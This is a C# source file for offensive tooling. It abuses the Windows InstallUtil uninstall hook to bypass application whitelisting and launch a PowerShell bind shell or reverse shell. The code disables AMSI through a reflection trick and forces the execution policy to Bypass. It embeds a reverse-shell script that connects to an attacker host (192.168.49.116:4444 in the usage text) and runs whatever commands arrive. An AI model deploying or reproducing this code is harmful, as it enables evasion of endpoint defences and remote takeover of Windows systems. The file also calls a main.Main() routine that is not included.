/*
    Bug List
    - On certain environments, InstallUtil fails when the binary is downloaded via a web browser
      => Use curl, certutil, UNC copy or any other methods to upload binary
*/

using System;
using System.IO;
using System.Text;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

[System.ComponentModel.RunInstaller(true)]
public class Uninstaller : System.Configuration.Install.Installer
{
    public static string shellType = null;
    public static string host = null;
    public static string port = null;

    public static void ExecuteBindShell()
    {
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();

        RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
        runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process");

        Pipeline bypass = runspace.CreatePipeline();
        bypass.Commands.AddScript("Foreach($au in [Ref].Assembly.GetTypes()) { if ($au.Name -like '*iUtils') { Foreach($aif in $au.GetFields('NonPublic,Static')) { if ($aif.Name -like '*Failed') { $aif.SetValue($null,$true); }}}}");
        bypass.Invoke();

        string command = "";
        do
        {
            Console.Write("PS > ");
            command = Console.ReadLine();

            if (!string.IsNullOrEmpty(command))
            {
                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    try
                    {
                        pipeline.Commands.AddScript(command);
                        pipeline.Commands.Add("Out-String");
                        Collection<PSObject> results = pipeline.Invoke();

                        StringBuilder stringBuilder = new StringBuilder();
                        foreach (PSObject obj in results)
                            stringBuilder.AppendLine(obj.ToString());
                        Console.Write(stringBuilder.ToString());
                    }
                    catch (Exception e) { Console.WriteLine(e.Message); }
                }
            }
        }
        while (command != "exit");
    }

    public static void ExecuteReverseShell()
    {
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();

        RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
        runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process");

        Pipeline bypass = runspace.CreatePipeline();
        bypass.Commands.AddScript("Foreach($au in [Ref].Assembly.GetTypes()) { if ($au.Name -like '*iUtils') { Foreach($aif in $au.GetFields('NonPublic,Static')) { if ($aif.Name -like '*Failed') { $aif.SetValue($null,$true); }}}}");
        bypass.Invoke();

        string command = @"
$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  try
  {
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
  }
  catch
  {
    $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
    $sendback2  =  ""ERROR: "" + $error[0].ToString() + ""`n`n"" + ""PS "" + (pwd).Path + '> ';
  }
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
};
$client.Close();";
        command = command.Replace("{host}", host).Replace("{port}", port);

        Pipeline pipeline = runspace.CreatePipeline();
        pipeline.Commands.AddScript(command.Trim());
        pipeline.Commands.Add("Out-String");
        pipeline.Invoke();
    }

    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        shellType = this.Context.Parameters["shelltype"];
        host = this.Context.Parameters["host"];
        port = this.Context.Parameters["port"];
        string filename = Path.GetFileName(this.Context.Parameters["assemblypath"]);

        if (shellType != null && shellType != "bind" && shellType != "reverse")
        {
            Console.WriteLine("[-] Must specify shell type : none, bind, reverse");
            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U " + filename);
            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=bind " + filename);
            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=reverse /host=192.168.49.116 /port=4444 " + filename);
            return;
        }
        else if (shellType == "reverse" && (host == null || port == null))
        {
            Console.WriteLine("[-] Must specify remote host and port for a reverse shell");
            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=reverse /host=192.168.49.116 /port=4444 " + filename);
            return;
        }

        main.Main();
    }
}